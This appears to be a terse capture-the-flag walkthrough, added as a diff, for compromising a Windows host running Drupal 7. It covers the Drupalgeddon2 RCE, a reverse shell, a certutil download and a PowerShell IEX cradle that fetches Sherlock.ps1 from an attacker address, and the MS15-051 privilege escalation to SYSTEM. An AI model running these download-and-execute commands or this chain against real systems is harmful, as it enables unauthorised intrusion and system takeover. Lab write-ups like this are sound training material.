@@ -1,0 +1,15 @@
+step 1 - enumeration
+- nmap reveals port 80, 135 and 49154 are open
+- enumerating running services will show drupal 7 is running on the remote host
+- running the version through searchsploit reveals drupalgeddon2 RCE exploit
+
+step 2 - foothold
+- running drupalgeddon2 exploit we are given a reverse php shell which doesnt allow for escping the directory
+- using the syntax "certutil -URLCache -f http:/10.10.<IP>:<port>/<file> c:\<file>" we upload a shell with less rescrictions than a shell running in a webpage
+- we now run the new reverse shell
+
+step 3 - enumeration
+- using the syntax "echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14:8000/Sherlock.ps1') | powershell -noprofile - >> bob.txt" we are able to get sherlock to run and provide output on low hanging fruit, from here we find 'MS15-051' which with some googlefu we find 'https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip'
+
+step 4 - priviledge escalation
+- running the revershell we uploaded earlier under the priviledge escalation technique we will receive a system level shell back to us
